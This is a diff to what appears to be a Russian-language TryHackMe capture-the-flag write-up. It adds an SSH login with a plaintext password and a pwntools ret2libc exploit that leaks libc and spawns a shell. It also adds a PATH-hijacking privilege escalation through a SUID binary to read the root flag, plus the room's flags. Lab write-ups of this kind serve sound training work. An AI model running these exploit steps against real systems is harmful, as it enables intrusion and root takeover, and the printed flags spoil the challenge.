@@ -48,6 +48,42 @@ THM{crack3d_th3_gu4rd1an}
 ### Ответьте на вопросы ниже
 binexgod_flag.txt
 ```commandline
+ssh guardian@<IP>
+GOg0esGrrr!
+
+nano exploit.py
+
+from pwn import *
+
+elf = context.binary = ELF('./pwn_me')
+libc = elf.libc
+p = process()
+
+#get the leaked address
+p.recvuntil('at: ')
+system_leak = int(p.recvline(), 16)
+
+#set our libc address according to the leaked address
+libc.address = system_leak - libc.sym['system']
+log.success('LIBC base: {}'.format(hex(libc.address)))
+
+#get location of binsh from libc
+binsh = next(libc.search(b'/bin/sh'))
+
+#build the rop chain
+rop = ROP(libc)
+rop.raw('A' * 32)
+rop.system(binsh)
+
+#send our rop chain
+p.sendline(rop.chain())
+
+#Get the shell
+p.interactive()
+
+python3 exploit.py
+```
+```commandline
 THM{b1n3xg0d_pwn3d}
 ```
 
@@ -55,6 +91,28 @@ THM{b1n3xg0d_pwn3d}
 Ты стал богом бинекса, но сможешь ли ты получить корневой флаг небес?
 ### Ответьте на вопросы ниже
 корень.txt
+```commandline
+cd /home/binexgod
+echo '#include<stdio.h>
+#include<stdlib.h>
+
+int main()
+{
+  system("/bin/bash");
+}' >> echo.c
+
+
+
+gcc -o echo echo.c
+chmod 777 echo
+echo $PATH
+export PATH=/tmp:$PATH
+
+
+./vuln
+
+cat /root/root.txt
+```
 ```commandline
 THM{r00t_of_th3_he4v3n}
 ```
